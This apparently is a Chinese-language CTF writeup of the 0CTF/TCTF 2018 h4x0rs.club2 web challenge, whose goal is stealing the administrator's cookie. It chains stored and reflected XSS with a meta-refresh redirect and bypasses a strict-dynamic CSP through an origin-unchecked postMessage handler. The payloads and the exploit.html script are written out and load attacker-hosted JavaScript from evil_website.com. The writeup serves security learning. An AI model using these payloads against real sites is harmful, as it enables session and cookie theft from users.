---
title: TCTF/0CTF2018 h4xors.club2 Writeup
date: 2018-04-10 01:40:19
tags:
- postMessage
- xss
- CSP
---

本来早就该完成的club2 wp因为清明节的关系拖了一段时间，club2这个题目用了一很精巧的postMessage漏洞。

<!--more-->



# h4xors.club2 #

一个非常有意思的题目，做这题的时候有一点儿钻牛角尖了，后面想来有挺多有意思的点。先分享一个非常秀的非预期解wp。

[http://www.wupco.cn/?p=4408&from=timeline](http://www.wupco.cn/?p=4408&from=timeline)

在分享一个写的比较详细的正解

[https://gist.github.com/paul-axe/869919d4f2ea84dea4bf57e48dda82ed](https://gist.github.com/paul-axe/869919d4f2ea84dea4bf57e48dda82ed)

下面顺着思路一起来看看这题。

```
Get document .cookie of the administartor.
h4x0rs.club
backend_www got backup at /var/www/html.tar.gz   这个从头到尾都没找到

Hint: Get open-redirect first, lead admin to the w0rld!
```

站内差不多是一个答题站点，用了比较多的第三方库，站内的功能比较有限。

1、profile.php可以修改自己个人信息
2、user.php/{id}可以访问自己的个人信息
3、report.php没什么可说的，向后台发送请求，需要注意的是，直接发送user.php，不能控制
4、index.php接受msg参数

还有一些特别的点

1、user.php页面的CSP为

```
Content-Security-Policy:default-src 'none'; img-src * data: ; script-src 'nonce-c8ebe81fcdccc3ac7833372f4a91fb90'; style-src 'self' 'unsafe-inline' fonts.googleapis.com; font-src 'self' fonts.gstatic.com; frame-src https://www.google.com/recaptcha/;
```

非常严格，只允许nonce CSP的script解析

index.php页面的CSP为
```
Content-Security-Policy:script-src 'nonce-120bad5af0beb6b93aab418bead3d9ab' 'strict-dynamic';
```

允许sd CSP动态执行script（这里的出发点可能是index.php是加载游戏的地方，为了适应CSP，必须加入`strict-dynamic`。）

2、站内有两个xss点

第一个是user.php的profile，储存型xss，没有任何过滤。

第二个是index.php的msg参数，反射性xss，没有任何过滤，但是受限于xss auditor


顺着思路向下

因为user.php页面的CSP非常严格，我们需要跳出这个严格的地方，于是可以通过插入meta标签，跳转到index.php，在这里进一步操作
```
<meta http-equiv="refresh" content="5;https://h4x0rs.club/game/?msg=Welcome">
```

当然这里我们也可以利用储存型xss和页面内的一段js来构造a标签跳转。

在user.php的查看profile页面，我们可以看到
```
if(location.hash.slice(1) == 'report'){
    document.getElementById('report-btn').click();
}
```

当我们插入
```
<a href='//xxx.xx/evil.html' id=report-btn>
```

并请求
```
/game/user.php/ddog%23report
```

那么这里的a标签就会被点击，同样可以实现跳转。



接着我们探究index.php，这里我们的目标就是怎么能够绕过sd CSP了，当时的第一个想法是`<base>`，通过修改当前页面的根域，我们可以加载其他域的js（听起来很棒！

可惜如果我们请求
```
https://h4x0rs.club/game/?msg=<base href="http://xxxx">
```

会被xss auditor拦截，最后面没办法加`/">`，一个非常有趣的情况出现了

```
https://h4x0rs.club/game/?msg=%3Cbase%20href=%22http://115.28.78.16
```

![image.png-7.8kB][4]

最后的`</h1>`中的`/`被转换成了路径，前面的左尖括号被拼入了域名中，后面的右尖括号闭合标签...一波神奇的操作...

不过这里因为没法处理尖括号域名的事情，所以置于后话不谈。

我们继续讨论绕过sd CSP的思路，这种CSP已知只有一种办法，就是通过现在已有的js代码构造xss，这是一种在去年blackhat大会上google团队公布的CSP Bypass技巧，叫做Script Gadgets。

[https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)

这里的漏洞点和ppt中的思路不完全一致，但核心思路一样，都是要利用已有js代码中的一些点来构造利用。

站内关于游戏的代码在app.js中的最下面，加载了client.js
```
function load_clientjs(){
    var s = document.createElement('script');
    document.body.appendChild(s);
    s.defer = true;
    s.src = '/game/javascripts/client.js';
}
```

client.js中的代码不多，有一些值得注意的点，就是客户端是通过`postMessage`和服务端交互的。

![image.png-94.1kB][5]

而且所有的交互都没有对来源的校验，也就是可以接受任何域的请求。

**ps: 这是一个呆子不开口在2016年乌云峰会上提到的攻击手法，通过postMessage来伪造请求**

这样我们可以使用iframe标签来向beckend页面发送请求，通过这种方式来控制返回的消息。

这里我盗用了一张别的wp中的图，来更好的描述这种手法

原图来自[https://github.com/l4wio/CTF-challenges-by-me/tree/master/0ctf_quals-2018/h4x0rs.club](https://github.com/l4wio/CTF-challenges-by-me/tree/master/0ctf_quals-2018/h4x0rs.club)

![image.png-112.7kB][6]

这里我们的exploit.html充当了中间人的决赛，代替客户端向服务端发送请求，来获取想要的返回

这里我们可以关注一下client.js中的recvmsg

![image.png-323.9kB][7]

如果我们能控制data.title，通过这里的dom xss，我们可以成功的绕过index.php下的sd CSP限制。

值得注意的是，如果我们试图通过index.php页面的反射性xss来引入iframe标签的话，如果iframe标签中的链接是外域，会被xss auditor拦截。

所以这里需要用user.php的储存型xss跳出。这样利用链比较完整了。

下面是利用思路：

1、首先我们需要注册两个账号，这里使用ddog123和ddog321两个账号。

2、在ddog321账号中设置profile公开，并设置内容为

```
<meta http-equiv="refresh" content="0;https://evil_website.com">
```

3、在evil_website.com（这里有个很关键的tips，这里只能使用https站，否则会爆引入混合数据，阻止访问）的index.html向backend发送请求，这里的js需要设置ping和badges，在badges中设置title来引入js

```
<iframe name=game src='//backend.h4x0rs.club/backend_www/'></iframe>

<script>
window.addEventListener("message", receiveMessage, false);
var TOKEN,nonce;
function receiveMessage(event)
{
console.log("msg");
data = event.data;
if(data.cmd =='ping'){
    TOKEN = data.TOKEN;
    nonce = data.nonce;
    game.postMessage(data,"*");
}
if(data.cmd =='badges'){
    console.log('badges');
    console.log(data);
    TOKEN = data.TOKEN;
    data.level = 1;
    data.title = '\'"><script src="//evil_website.com/1.js" defer></scr'+'ipt>';
    console.log(data.title);
    // data.title = '\'"><meta http-equiv="set-cookie" content="HolidayGlaze=123;">';
    game.postMessage(data,"*");
}
}
```

4、在ddog123账户中设置profile为

```
<meta http-equiv="refresh" content="0;https://h4x0rs.club/game/?msg=1%3Ciframe%20name=game_server%20src=/game/user.php/ddog321%20%3E%3C/iframe%3E">
```

5、最后在1.js中加入利用代码，发送report给后台等待返回即可。




  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/bz7gl9fs2q89pvezn6xm03xb/image.png
  [2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/io54g5yal3om63po5w4e9qvn/image.png
  [3]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/4wljy4njhwsq583n1cpz8rvi/image.png
  [4]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/elpojcabch5pk77o79de6m12/image.png
  [5]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/fij89ai2u0ls69du1qkc7fl2/image.png
  [6]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/o0jxd89x9r60btxhsln4vum2/image.png
  [7]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/9xqbie6lw0xwoe6ooz0s2dsb/image.png
